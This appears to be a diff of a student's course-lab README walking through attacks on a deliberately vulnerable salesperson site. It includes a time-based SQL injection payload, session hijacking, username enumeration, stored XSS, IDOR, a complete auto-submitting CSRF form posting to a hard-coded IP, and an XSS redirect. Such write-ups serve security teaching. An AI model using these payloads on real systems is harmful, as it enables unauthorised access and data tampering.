@@ -18,40 +18,73 @@ Each version of the site has been given two of the six vulnerabilities. (In othe
 
 Vulnerability #1: SQL Injection
 * View a any salesperson's profile
-* The end of the url should be "id=someInteger"
+* The end of the url should be ```id=someInteger```
 * Replace the integer with ```' OR SLEEP(10)=0--'``` and press enter
 * The webpage should reload after 10 seconds
 
-  - [ ] GIF Walkthrough: ![](https://i.imgur.com/PlGJagH.gif)
+- [ ] GIF Walkthrough: ![](https://i.imgur.com/PlGJagH.gif)
 
-Vulnerability #2: Session Hijacking/Fixation
-  - [ ] GIF Walkthrough: ![](https://i.imgur.com/MJgbz9K.gif)
+Vulnerability #2: Session Hijacking
+* Use two browsers: Chrome (target) and Firefox (attacker)
+* Login to the target and navigate to ```public/hacktools/change_session_id.php``` to get the session ID
+* Attacker navigate to ```public/hacktools/change_session_id.php``` and change the session ID to the target's session ID
+* Should be able to login without entering a username and password
+
+- [ ] GIF Walkthrough: ![](https://i.imgur.com/MJgbz9K.gif)
 
 
 ## Green
 
 Vulnerability #1: Username Enumeration
-  - [ ] GIF Walkthrough: ![](https://i.imgur.com/BqJcyXR.gif)
+* Note that ```pperson``` and ```jmonroe99``` are both valid usernames
+* When trying to login using a valid username and invalid password will result in a bolded error message
+* However trying to login with an invalid username and password will result in a non-bolded error message
+- [ ] GIF Walkthrough: ![](https://i.imgur.com/BqJcyXR.gif)
 
 Vulnerability #2: Cross-Site Scripting
-  - [ ] GIF Walkthrough: ![](https://i.imgur.com/esx4HyK.gif)
+* In the Contact section you can add an alert script
+* This alert will be triggered when a logged-in user visits the feedback section
+- [ ] GIF Walkthrough: ![](https://i.imgur.com/esx4HyK.gif)
 
 
 ## Red
 
 Vulnerability #1: Insecure Direct Object Reference
-  - [ ] GIF Walkthrough: ![](https://i.imgur.com/dOBXRlO.gif)
+* View any salesperson's profile (do not log in)
+* You can view hidden profile's by changing the ID value at the end of the URL
+* Specifically salespeople with IDs 10 and 11 should not be accessible to those not logged in
+* When the ID value is modified to 10 or 11 in the green and blue websites, the site redirects to the territories.php page corresponding to the heading "Find a Salesperson"
+- [ ] GIF Walkthrough: ![](https://i.imgur.com/dOBXRlO.gif)
 
 Vulnerability #2: Cross-Site Request Forgery
-  - [ ] GIF Walkthrough: ![](https://i.imgur.com/6sB7IlD.gif)
+* Submit a link to the following malicious webpage in the Contact section
+```
+<html>
+  <head>
+    <title>Feedback</title>
+  </head>
+  <body onload="document.CSRF.submit()">
+	<form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=4" method="post" style="display: none;" name='CSRF' target="res">
+	    <input type="text" name="first_name" value="No Longer Robert" />
+      	<input type="text" name="last_name" value="HACKED" />
+      	<input type="text" name="phone" value="123-456-789" />
+      	<input type="text" name="email" value="who@HACKED.com" />
+	</form>
+    <iframe name="res" style="display: none;"></iframe>
+  </body>
+</html>
+```
+* This page will silently submit a form edit to the salesperson Robert Hamilton
+* This form submission will only occur when a logged-in user views the feedback section and navigates to the link provided
+- [ ] GIF Walkthrough: ![](https://i.imgur.com/6sB7IlD.gif)
 
 
 ## Bonus Objective
 
 Vulnerability: Build on cross-site scripting to dedirect the user to a new URL
-  - [ ] GIF Walkthrough: ![](https://i.imgur.com/NMNsFw7.gif)
+* This exploit uses the same Cross-Site Scriping idea shown above but instead of showing an alert popup it will redirect the user to a new webpage
+* The redirection is achieved by using ```window.location.assign("url")```
+- [ ] GIF Walkthrough: ![](https://i.imgur.com/NMNsFw7.gif)
 
 
 ## Notes
-
-Describe any challenges encountered while doing the work
